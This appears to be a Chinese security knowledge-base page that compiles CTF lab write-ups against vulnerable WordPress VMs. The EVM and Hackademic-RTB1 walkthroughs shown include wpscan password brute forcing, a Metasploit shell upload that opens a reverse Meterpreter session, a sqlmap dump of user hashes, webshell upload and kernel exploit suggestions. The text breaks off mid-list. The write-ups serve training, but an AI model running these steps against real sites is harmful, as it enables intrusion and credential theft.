---
title: WordPress 插件与管理权限
date: '2026-11-25 12:00:00'
updated: '2026-11-25 12:00:00'
lang: zh-CN
permalink: knowledge/cms-wordpress/
categories:
- Web安全
- CMS与插件
tags:
- 知识库
- WordPress
- 文件上传
- 内核
- 凭据泄露
- 密码审计
- SUID
- SQL注入
- 2FA
- rsync
- LFI
- MySQL
description: WordPress 实验分别涉及登录反馈、插件读取、上传、数据库和本地任务。本章把同一入口之后的不同权限路径并列，保留原插件版本、账户状态与操作结果。
knowledge: true
copyright: true
toc:
  enable: true
  number: false
  max_depth: 2
---

WordPress 实验分别涉及登录反馈、插件读取、上传、数据库和本地任务。本章把同一入口之后的不同权限路径并列，保留原插件版本、账户状态与操作结果。

<nav class="kb-tools" aria-label="章节操作">
<a href="/knowledge/">知识库目录</a>
<a href="/guide/">研究导读</a>
<a href="/knowledge/cms-wordpress/source.md" download>下载 Markdown</a>
<button type="button" data-expand-evidence>展开全部技术记录</button>
</nav>

<!--more-->

## 分析重点

Phoenix 的盲注与上传属于两个插件，OTP 和 rsync 是后续系统阶段。

Stapler 同时保留文件读取、数据库写入、历史记录与内核分支。

EVM、Mr Robot 与 Hackademic 保留账户确认和实际文件执行证据。

## 案例与技术索引

| 分析入口 | 实验来源 | 技术点 |
| --- | --- | --- |
| [WordPress 账户与配置凭据](#case-evm) | evm | WordPress、凭据泄露、文件上传 |
| [Web 写入与内核提权候选](#case-hackademic-rtb1) | Hackademic-RTB1 | WordPress、文件上传、内核 |
| [认证响应、去重字典与交互式程序](#case-mr-robot-1) | Mr-Robot-1 | WordPress、密码审计、SUID |
| [插件盲注与双因素验证材料](#case-phoenix) | phoenix | WordPress、SQL注入、2FA、rsync |
| [插件文件读取与数据库写入](#case-stapler-1) | Stapler-1 | WordPress、LFI、MySQL、内核 |

<a id="case-evm"></a>

## WordPress 账户与配置凭据

原链由用户名枚举、后台认证到插件执行，再追踪本地泄露的 root 密码。保留各次工具输出与认证结果。

<p class="kb-provenance">来源 evm · 原记录 2020-05-23 · 8 个代码块 · 1 处图片引用</p>

<details class="kb-evidence" id="record-evm">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start evm -->

#### name

Name: EVM: 1
Date release: 2 Nov 2019

#### download

Download: https://mega.nz/#F!pVV1CKYI!ABCpQ0qUdbuYIszf0ljH1w
Download (Mirror): https://download.vulnhub.com/evm/EVM.ova
Download (Torrent): https://download.vulnhub.com/evm/EVM.ova.torrent

#### description

This is super friendly box intended for Beginner's

This may work better with VirtualBox than VMware



#### information gathering

first use nmap as usual

``` bash
root@kali:~# nmap -sn -v 192.168.56.*
Nmap scan report for 192.168.56.103
Host is up (0.00026s latency).
MAC Address: 08:00:27:90:6F:5B (Oracle VirtualBox virtual NIC)
```

``` bash
root@kali:~# nmap -sV -sC -T4 -p- -v -A 192.168.56.103
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a2:d3:34:13:62:b1:18:a3:dd:db:35:c5:5a:b7:c0:78 (RSA)
|   256 85:48:53:2a:50:c5:a0:b7:1a:ee:a4:d8:12:8e:1c:ce (ECDSA)
|_  256 36:22:92:c7:32:22:e3:34:51:bc:0e:74:9f:1c:db:aa (ED25519)
53/tcp  open  domain      ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: PIPELINING TOP RESP-CODES CAPA UIDL SASL AUTH-RESP-CODE
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: ID OK LITERAL+ IDLE LOGIN-REFERRALS SASL-IR more ENABLE have listed post-login capabilities Pre-login IMAP4rev1 LOGINDISABLEDA0001
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
MAC Address: 08:00:27:90:6F:5B (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Uptime guess: 0.003 days (since Sat May 23 02:15:27 2020)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h19m58s, deviation: 2h18m33s, median: -1s
| nbstat: NetBIOS name: UBUNTU-EXTERMEL, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   UBUNTU-EXTERMEL<00>  Flags: <unique><active>
|   UBUNTU-EXTERMEL<03>  Flags: <unique><active>
|   UBUNTU-EXTERMEL<20>  Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: ubuntu-extermely-vulnerable-m4ch1ine
|   NetBIOS computer name: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE\x00
|   Domain name: \x00
|   FQDN: ubuntu-extermely-vulnerable-m4ch1ine
|_  System time: 2020-05-23T02:20:13-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-05-23T06:20:13
|_  start_date: N/A
```

 - Enumeration

use dirb

``` bash
root@kali:~# dirb http://192.168.56.103/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon May 25 06:24:07 2020
URL_BASE: http://192.168.56.103/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.103/ ----
+ http://192.168.56.103/index.html (CODE:200|SIZE:10821)                                            
+ http://192.168.56.103/info.php (CODE:200|SIZE:83014)                                              
+ http://192.168.56.103/server-status (CODE:403|SIZE:302)                                           
==> DIRECTORY: http://192.168.56.103/wordpress/                                                     
                                                                                                    
---- Entering directory: http://192.168.56.103/wordpress/ ----
+ http://192.168.56.103/wordpress/index.php (CODE:301|SIZE:0)                                       
==> DIRECTORY: http://192.168.56.103/wordpress/wp-admin/                                            
==> DIRECTORY: http://192.168.56.103/wordpress/wp-content/                                          
==> DIRECTORY: http://192.168.56.103/wordpress/wp-includes/                                         
+ http://192.168.56.103/wordpress/xmlrpc.php (CODE:405|SIZE:42)                                     
                                                                                                    
---- Entering directory: http://192.168.56.103/wordpress/wp-admin/ ----
+ http://192.168.56.103/wordpress/wp-admin/admin.php (CODE:302|SIZE:0)                              
==> DIRECTORY: http://192.168.56.103/wordpress/wp-admin/css/                                        
==> DIRECTORY: http://192.168.56.103/wordpress/wp-admin/images/                                     
==> DIRECTORY: http://192.168.56.103/wordpress/wp-admin/includes/                                   
+ http://192.168.56.103/wordpress/wp-admin/index.php (CODE:302|SIZE:0)                              
==> DIRECTORY: http://192.168.56.103/wordpress/wp-admin/js/                                         
==> DIRECTORY: http://192.168.56.103/wordpress/wp-admin/maint/                                      
==> DIRECTORY: http://192.168.56.103/wordpress/wp-admin/network/                                    
==> DIRECTORY: http://192.168.56.103/wordpress/wp-admin/user/                                       
                                                                                                    
---- Entering directory: http://192.168.56.103/wordpress/wp-content/ ----
+ http://192.168.56.103/wordpress/wp-content/index.php (CODE:200|SIZE:0)                            
==> DIRECTORY: http://192.168.56.103/wordpress/wp-content/plugins/                                  
==> DIRECTORY: http://192.168.56.103/wordpress/wp-content/themes/                                   
==> DIRECTORY: http://192.168.56.103/wordpress/wp-content/uploads/                                  
                                                                                                    
---- Entering directory: http://192.168.56.103/wordpress/wp-includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                    
---- Entering directory: http://192.168.56.103/wordpress/wp-admin/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                    
---- Entering directory: http://192.168.56.103/wordpress/wp-admin/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                    
---- Entering directory: http://192.168.56.103/wordpress/wp-admin/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                    
---- Entering directory: http://192.168.56.103/wordpress/wp-admin/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                    
---- Entering directory: http://192.168.56.103/wordpress/wp-admin/maint/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                    
---- Entering directory: http://192.168.56.103/wordpress/wp-admin/network/ ----
+ http://192.168.56.103/wordpress/wp-admin/network/admin.php (CODE:302|SIZE:0)                      
+ http://192.168.56.103/wordpress/wp-admin/network/index.php (CODE:302|SIZE:0)                      
                                                                                                    
---- Entering directory: http://192.168.56.103/wordpress/wp-admin/user/ ----
+ http://192.168.56.103/wordpress/wp-admin/user/admin.php (CODE:302|SIZE:0)                         
+ http://192.168.56.103/wordpress/wp-admin/user/index.php (CODE:302|SIZE:0)                         
                                                                                                    
---- Entering directory: http://192.168.56.103/wordpress/wp-content/plugins/ ----
+ http://192.168.56.103/wordpress/wp-content/plugins/index.php (CODE:200|SIZE:0)                    
                                                                                                    
---- Entering directory: http://192.168.56.103/wordpress/wp-content/themes/ ----
+ http://192.168.56.103/wordpress/wp-content/themes/index.php (CODE:200|SIZE:0)                     
                                                                                                    
---- Entering directory: http://192.168.56.103/wordpress/wp-content/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Mon May 25 06:24:47 2020
DOWNLOADED: 36896 - FOUND: 14
```

use wpscan for more information

``` bash
root@kali:~# wpscan --url http://192.168.56.103/wordpress/ -e at -e ap -e u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.7.6
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.56.103/wordpress/
[+] Started: Mon May 25 06:27:45 2020

Interesting Finding(s):

[+] http://192.168.56.103/wordpress/
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://192.168.56.103/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://192.168.56.103/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.56.103/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] http://192.168.56.103/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.2.4 identified (Insecure, released on 2019-10-14).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.56.103/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.2.4</generator>
 |  - http://192.168.56.103/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.4</generator>

[+] WordPress theme in use: twentynineteen
 | Location: http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/
 | Last Updated: 2020-03-31T00:00:00.000Z
 | Readme: http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | Style URL: http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.4
 | Style Name: Twenty Nineteen
 | Style URI: https://wordpress.org/themes/twentynineteen/
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.4, Match: 'Version: 1.4'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=======================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] c0rrupt3d_brain
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.56.103/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

now use wpscan bruteforce user c0rrupt3d_brain's password

``` bash
wpscan --url http://192.168.56.103/wordpress -U c0rrupt3d_brain -P /usr/share/wordlists/rockyou.txt

[+] Performing password attack on Wp Login against 1 user/s
Trying c0rrupt3d_brain / 24992499 Time: 00:01:55 <============================> (10700 / 10700) 100.00% Time: 00:01:55
[SUCCESS] - c0rrupt3d_brain / 24992499                                                                                
                                                                                                            
[i] Valid Combinations Found:                                                                                 
 | Username: c0rrupt3d_brain, Password: 24992499
```

and we got Username: c0rrupt3d_brain, Password: 24992499

#### get a shell by using msf

``` bash
msf5 > use exploit/unix/webapp/wp_admin_shell_upload
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts 192.168.56.103
rhosts => 192.168.56.103
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set targeturi /wordpress
targeturi => /wordpress
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set username c0rrupt3d_brain
username => c0rrupt3d_brain
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set password 24992499
password => 24992499
msf5 exploit(unix/webapp/wp_admin_shell_upload) > exploit

[*] Started reverse TCP handler on 192.168.56.126:4444 
[*] Authenticating with WordPress using c0rrupt3d_brain:24992499...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /wordpress/wp-content/plugins/xryoFXviCZ/GWcWlbcKol.php...
[*] Sending stage (38288 bytes) to 192.168.56.103
[*] Meterpreter session 1 opened (192.168.56.126:4444 -> 192.168.56.103:52970) at 2020-05-25 06:39:50 -0400
[+] Deleted GWcWlbcKol.php
[+] Deleted xryoFXviCZ.php
[+] Deleted ../xryoFXviCZ

meterpreter >
```

then we got root's password

``` bash
$ cat .root_password_ssh.txt
cat .root_password_ssh.txt
willy26
```

#### privilege escalation

``` bash
$ su root
su root
Password: willy26

root@ubuntu-extermely-vulnerable-m4ch1ine:/home/root3r# cd ~
cd ~
root@ubuntu-extermely-vulnerable-m4ch1ine:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu-extermely-vulnerable-m4ch1ine:~# whoami
whoami
root
root@ubuntu-extermely-vulnerable-m4ch1ine:~# ls
ls
proof.txt
root@ubuntu-extermely-vulnerable-m4ch1ine:~# cat proof.txt
cat proof.txt
voila you have successfully pwned me :) !!!
:D
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub278.jpg)

Just such a simplest machine i have ever tried...:)

#### Summary of knowledge

 - wpscan find wordpress user
 - wpscan bruteforce wordpress user's pass
 - msf exploit/unix/webapp/wp_admin_shell_upload module to get a shell
 - root's password disclosure

#### Contact me

 - QQ: 1185151867
 - twitter: https://twitter.com/fdlucifer11
 - github: https://github.com/FDlucifer

<font color="blue">I'm lucifer11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more...</font>
<!-- kb:end evm -->

</details>

<a id="case-hackademic-rtb1"></a>

## Web 写入与内核提权候选

原记录从应用枚举进入文件写入，再逐个验证本地提权候选。成功分支和 Exploit Suggester 的候选列表保留区分。

<p class="kb-provenance">来源 Hackademic-RTB1 · 原记录 2019-12-11 · 11 个代码块 · 8 处图片引用</p>

<details class="kb-evidence" id="record-hackademic-rtb1">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start Hackademic-RTB1 -->

名称：Hackademic: RTB1
发布日期：2011年9月6日

#### 下载

 - Download (Mirror): [https://download.vulnhub.com/hackademic/Hackademic.RTB1.zip](https://download.vulnhub.com/hackademic/Hackademic.RTB1.zip)
 - Download (Torrent): [https://download.vulnhub.com/hackademic/Hackademic.RTB1.zip.torrent](https://download.vulnhub.com/hackademic/Hackademic.RTB1.zip.torrent)

描述：

这是mr.pr0n提出的第一个现实性黑客攻击挑战
下载目标并获得root。
尝试读取根目录中文件“ key.txt”的内容。
请享用！

漏洞：

 - 纯文本密码
 - 提权
 - 重用凭证
 - SQL注入
 - 不受限制地上传危险类型的文件

靶机打开界面

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub37.jpg)



#### 信息收集

上nmap

``` bash
nmap -sn -v 192.168.84.0/24

Nmap scan report for 192.168.84.140
Host is up (0.00027s latency).
MAC Address: 00:0C:29:01:8A:4D (VMware)
```

``` bash
root@kali:~# nmap -A -v -sS -Pn -T4 --script=vuln 192.168.84.140

PORT   STATE  SERVICE VERSION
22/tcp closed ssh
80/tcp open   http    Apache httpd 2.2.15 ((Fedora))
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /icons/: Potentially interesting folder w/ directory listing
|_http-server-header: Apache/2.2.15 (Fedora)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-trace: TRACE is enabled
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  BID:49303  CVE:CVE-2011-3192
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://www.tenable.com/plugins/nessus/55976
|       https://www.securityfocus.com/bid/49303
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|_      https://seclists.org/fulldisclosure/2011/Aug/175
| vulners: 
|   cpe:/a:apache:http_server:2.2.15: 
|       CVE-2011-3192   7.8     https://vulners.com/cve/CVE-2011-3192
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
|       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668
|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169
|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167
|       CVE-2013-2249   7.5     https://vulners.com/cve/CVE-2013-2249
|       CVE-2012-0883   6.9     https://vulners.com/cve/CVE-2012-0883
|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
|       CVE-2017-12171  6.4     https://vulners.com/cve/CVE-2017-12171
|       CVE-2013-1862   5.1     https://vulners.com/cve/CVE-2013-1862
|       CVE-2014-0231   5.0     https://vulners.com/cve/CVE-2014-0231
|       CVE-2014-0098   5.0     https://vulners.com/cve/CVE-2014-0098
|       CVE-2013-6438   5.0     https://vulners.com/cve/CVE-2013-6438
|       CVE-2012-4557   5.0     https://vulners.com/cve/CVE-2012-4557
|       CVE-2011-3368   5.0     https://vulners.com/cve/CVE-2011-3368
|       CVE-2010-2068   5.0     https://vulners.com/cve/CVE-2010-2068
|       CVE-2010-1452   5.0     https://vulners.com/cve/CVE-2010-1452
|       CVE-2012-0031   4.6     https://vulners.com/cve/CVE-2012-0031
|       CVE-2011-3607   4.4     https://vulners.com/cve/CVE-2011-3607
|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975
|       CVE-2013-1896   4.3     https://vulners.com/cve/CVE-2013-1896
|       CVE-2012-4558   4.3     https://vulners.com/cve/CVE-2012-4558
|       CVE-2012-3499   4.3     https://vulners.com/cve/CVE-2012-3499
|       CVE-2012-0053   4.3     https://vulners.com/cve/CVE-2012-0053
|       CVE-2011-4317   4.3     https://vulners.com/cve/CVE-2011-4317
|       CVE-2011-3639   4.3     https://vulners.com/cve/CVE-2011-3639
|       CVE-2011-3348   4.3     https://vulners.com/cve/CVE-2011-3348
|       CVE-2011-0419   4.3     https://vulners.com/cve/CVE-2011-0419
|       CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612
|       CVE-2012-2687   2.6     https://vulners.com/cve/CVE-2012-2687
|_      CVE-2011-4415   1.2     https://vulners.com/cve/CVE-2011-4415
```

打开发现是wordpress的，直接上wpscan

``` bash
root@kali:~# wpscan --url http://192.168.84.140/Hackademic_RTB1/
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.7.5
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://192.168.84.140/Hackademic_RTB1/
[+] Started: Tue Dec 10 21:58:17 2019

Interesting Finding(s):

[+] http://192.168.84.140/Hackademic_RTB1/
 | Interesting Entries:
 |  - Server: Apache/2.2.15 (Fedora)
 |  - X-Powered-By: PHP/5.3.3
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://192.168.84.140/Hackademic_RTB1/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 1.5.1.1 identified (Insecure, released on 2007-09-24).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.84.140/Hackademic_RTB1/?feed=rss2, <!-- generator="wordpress/1.5.1.1" -->
 |  - http://192.168.84.140/Hackademic_RTB1/?feed=rss2, <generator>http://wordpress.org/?v=1.5.1.1</generator>

[+] WordPress theme in use: starburst
 | Location: http://192.168.84.140/Hackademic_RTB1/wp-content/themes/starburst/
 | Latest Version: 1.1 (up to date)
 | Last Updated: 2008-09-15T00:00:00.000Z
 | Style URL: http://192.168.84.140/Hackademic_RTB1/wp-content/themes/starburst/style.css
 | Style Name: Starburst
 | Style URI: http://starburst.weirdncrazy.com
 | Description: A WordPress 1.5/2....
 | Author: Claire
 | Author URI: http://www.weirdncrazy.com/universe/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.84.140/Hackademic_RTB1/wp-content/themes/starburst/style.css, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub38.jpg)

点击之后在后面加上单引号，明显有注入

直接上sqlmap,这站太烂了;)

``` bash
sqlmap.py -r C:\Users\HASEE\AppData\Local\Temp\\1576033944962.req -D wordpress -T wp_users --dump

+----+-------------+---------+----------+----------+----------+----------+----------+----------------------------------+--------------+------------+-------------------------+-------------+-------------+--------------+---------------+---------------+---------------+----------------+---------------------+------------------+---------------------+
| ID | user_idmode | user_ip | user_icq | user_msn | user_yim | user_url | user_aim | user_pass                        | user_login   | user_level | user_email              | user_status | user_domain | user_browser | user_nicename | user_nickname | user_lastname | user_firstname | user_registered     | user_description | user_activation_key |
+----+-------------+---------+----------+----------+----------+----------+----------+----------------------------------+--------------+------------+-------------------------+-------------+-------------+--------------+---------------+---------------+---------------+----------------+---------------------+------------------+---------------------+
| 1  | login       | <blank> | 0        | <blank>  | <blank>  | http://  | <blank>  | 21232f297a57a5a743894a0e4a801fc3 | NickJames    | 1          | NickJames@hacked.com    | 0           | <blank>     | <blank>      | nickjames     | NickJames     | James         | Nick           | 2010-10-25 20:40:23 | <blank>          | <blank>             |
| 2  | login       | <blank> | 0        | <blank>  | <blank>  | http://  | <blank>  | b986448f0bb9e5e124ca91d3d650f52c | JohnSmith    | 0          | JohnSmith@hacked        | 0           | <blank>     | <blank>      | johnsmith     | JohnSmith     | Smith         | John           | 2010-10-25 21:25:22 | <blank>          | <blank>             |
| 3  | nickname    | <blank> | 0        | <blank>  | <blank>  | http://  | <blank>  | 7cbb3252ba6b7e9c422fac5334d22054 | GeorgeMiller | 10         | GeorgeMiller@hacked.com | 0           | <blank>     | <blank>      | georgemiller  | GeorgeMiller  | Miller        | George         | 2011-01-07 03:08:51 | <blank>          | <blank>             |
| 4  | nickname    | <blank> | 0        | <blank>  | <blank>  | http://  | <blank>  | a6e514f9486b83cb53d8d932f9a04292 | TonyBlack    | 0          | TonyBlack@hacked.com    | 0           | <blank>     | <blank>      | tonyblack     | TonyBlack     | Black         | Tony           | 2011-01-07 03:09:55 | <blank>          | <blank>             |
| 5  | nickname    | <blank> | 0        | <blank>  | <blank>  | http://  | <blank>  | 8601f6e1028a8e8a966f6c33fcd9aec4 | JasonKonnors | 0          | JasonKonnors@hacked.com | 0           | <blank>     | <blank>      | jasonkonnors  | JasonKonnors  | Konnors       | Jason          | 2011-01-07 03:10:36 | <blank>          | <blank>             |
| 6  | nickname    | <blank> | 0        | <blank>  | <blank>  | http://  | <blank>  | 50484c19f1afdaf3841a0d821ed393d2 | MaxBucky     | 0          | MaxBucky@hacked.com     | 0           | <blank>     | <blank>      | maxbucky      | MaxBucky      | Bucky         | Max            | 2011-01-07 03:11:18 | <blank>          | <blank>             |
+----+-------------+---------+----------+----------+----------+----------+----------+----------------------------------+--------------+------------+-------------------------+-------------+-------------+--------------+---------------+---------------+---------------+----------------+---------------------+------------------+---------------------+

NickJames   21232f297a57a5a743894a0e4a801fc3
JohnSmith   b986448f0bb9e5e124ca91d3d650f52c
GeorgeMiller  7cbb3252ba6b7e9c422fac5334d22054
TonyBlack   a6e514f9486b83cb53d8d932f9a04292
JasonKonnors 8601f6e1028a8e8a966f6c33fcd9aec4
MaxBucky   50484c19f1afdaf3841a0d821ed393d2
```

#### 上传shell

5个用户爆出账号密码之后，发现GeorgeMiller有管理员权限，使用此账号登录GeorgeMiller/q1w2e3
如下图所示改为允许php文件上传

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub39.jpg)

上传文件成功

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub40.jpg)

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub41.jpg)

#### 提权

冰蝎中执行命令查看内核版本

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub42.jpg)

``` bash
Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux
```

为此内核使用漏洞利用建议脚本。 可以在这里下载脚本[Linux_Exploit_Suggester](https://github.com/PenturaLabs/Linux_Exploit_Suggester)

``` bash
root@kali:~# ./Linux_Exploit_Suggester.pl -k 2.6.31

Kernel local: 2.6.31

Searching among 65 exploits...

Possible Exploits:
[+] american-sign-language
   CVE-2010-4347
   Source: http://www.securityfocus.com/bid/45408/
[+] can_bcm
   CVE-2010-2959
   Source: http://www.exploit-db.com/exploits/14814/
[+] do_pages_move
   Alt: sieve    CVE-2010-0415
   Source: Spenders Enlightenment
[+] half_nelson
   Alt: econet    CVE-2010-3848
   Source: http://www.exploit-db.com/exploits/6851
[+] half_nelson1
   Alt: econet    CVE-2010-3848
   Source: http://www.exploit-db.com/exploits/17787/
[+] half_nelson2
   Alt: econet    CVE-2010-3850
   Source: http://www.exploit-db.com/exploits/17787/
[+] half_nelson3
   Alt: econet    CVE-2010-4073
   Source: http://www.exploit-db.com/exploits/17787/
[+] msr
   CVE-2013-0268
   Source: http://www.exploit-db.com/exploits/27297/
[+] pipe.c_32bit
   CVE-2009-3547
   Source: http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c
[+] pktcdvd
   CVE-2010-3437
   Source: http://www.exploit-db.com/exploits/15150/
[+] ptrace_kmod2
   Alt: ia32syscall,robert_you_suck    CVE-2010-3301
   Source: http://www.exploit-db.com/exploits/15023/
[+] rawmodePTY
   CVE-2014-0196
   Source: http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c
[+] rds
   CVE-2010-3904
